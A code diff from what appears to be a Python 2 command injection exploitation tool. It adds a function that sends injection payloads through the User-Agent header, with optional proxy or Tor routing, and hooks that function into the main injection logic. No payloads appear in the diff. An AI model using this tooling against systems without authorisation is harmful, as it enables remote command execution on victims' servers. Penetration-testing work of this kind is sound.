@@ -176,7 +176,54 @@ def cookie_injection_test(url, vuln_parameter, payload):
   
   return response
 
+# ------------------------------------------------------------------
+# Check if target host is vulnerable.(User-Agent-based injection)
+# ------------------------------------------------------------------
+def user_agent_injection_test(url, vuln_parameter, payload):
 
+  def inject_user_agent(url, vuln_parameter, payload, proxy):
+
+    if proxy == None:
+      opener = urllib2.build_opener()
+    else:
+      opener = urllib2.build_opener(proxy)
+
+    request = urllib2.Request(url)
+    #Check if defined extra headers.
+    headers.do_check(request)
+    request.add_header('User-Agent', urllib.unquote(payload))
+    response = opener.open(request)
+    return response
+
+  proxy = None 
+  response = inject_user_agent(url, vuln_parameter, payload, proxy)
+  # Check if defined any HTTP Proxy.
+  if menu.options.proxy:
+    try:
+      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
+      response = inject_user_agent(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  # Check if defined Tor.
+  elif menu.options.tor:
+    try:
+      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
+      response = inject_user_agent(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  else:
+    try:
+      response = inject_user_agent(url, vuln_parameter, payload, proxy)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+  
+
+  return response
 
 # -------------------------------------------
 # The main command injection exploitation.
@@ -201,6 +248,10 @@ def injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method,
   if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
     response = cookie_injection_test(url, vuln_parameter, payload)
 
+  # Check if defined user-agent with "INJECT_HERE" tag
+  elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
+    response = user_agent_injection_test(url, vuln_parameter, payload)
+    
   else:
     # Check if defined method is GET (Default).
     if http_request_method == "GET":
